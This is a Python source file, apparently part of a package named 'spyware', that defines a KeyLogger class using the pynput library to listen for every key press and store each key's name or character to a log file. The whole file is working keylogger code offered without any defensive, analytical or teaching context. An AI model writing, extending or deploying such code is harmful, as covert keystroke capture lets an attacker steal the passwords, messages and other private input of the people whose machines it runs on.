from pynput.keyboard import Listener
from pynput.keyboard import KeyCode
from pynput.keyboard import Key

from spyware.loggers.logger import Logger
from spyware.logs.keylog import KeyLog

from typing import Union

class KeyLogger(Logger):
    def on_press(self, key: Union[Key, KeyCode]) -> None:
        if isinstance(key, Key):
            KeyLog(key.name).store(self.filename)

        if isinstance(key, KeyCode):
            KeyLog(key.char).store(self.filename)

    def listen(self):
        with Listener(on_press = self.on_press) as listener:
            listener.join()
